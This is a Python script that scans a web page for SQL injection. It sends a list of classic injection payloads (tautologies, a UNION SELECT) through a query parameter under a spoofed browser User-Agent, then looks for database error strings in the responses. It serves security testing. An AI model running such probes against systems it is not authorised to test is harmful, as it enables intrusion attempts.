import requests
from urllib.parse import quote_plus
import logging

# Don't copy this script. This script is developed by Tawfique Elahey.

# List of common SQL injection payloads
sql_injection_payloads = [
    "' OR 1=1 --", 
    "' OR 'a'='a", 
    "' OR 1=1#",
    '" OR "a"="a',
    "' UNION SELECT NULL, NULL, NULL --",
    "' AND 1=1 --",
    "' AND 1=1#"
]

# Function to test for SQL injection vulnerabilities
def test_sql_injection(url, param='id'):
    # Set up logging for better reporting
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
    
    for payload in sql_injection_payloads:
        # URL encode the payload to prevent issues with special characters
        encoded_payload = quote_plus(payload)
        
        # Construct the URL with the payload (assuming the parameter is specified)
        injection_url = f"{url}?{param}={encoded_payload}"
        
        # Set the headers, including a user-agent to prevent blocking
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'
        }
        
        try:
            # Send GET request with the payload
            response = requests.get(injection_url, headers=headers, timeout=10)
            
            # Check if the response contains potential signs of SQL injection
            if response.status_code == 200:
                if "error" in response.text or "mysql" in response.text or "syntax" in response.text:
                    logging.warning(f"Potential SQL Injection vulnerability detected with payload: {payload}")
                    logging.warning(f"Response: {response.text[:200]}...")  # Print the first 200 characters of the response
                else:
                    logging.info(f"No vulnerability detected with payload: {payload}")
            else:
                logging.error(f"Non-200 HTTP response: {response.status_code} for URL: {injection_url}")
        except requests.RequestException as e:
            logging.error(f"Error testing {injection_url}: {e}")

# Test the function
url_to_test = 'http://example.com/vulnerable_page'
test_sql_injection(url_to_test)
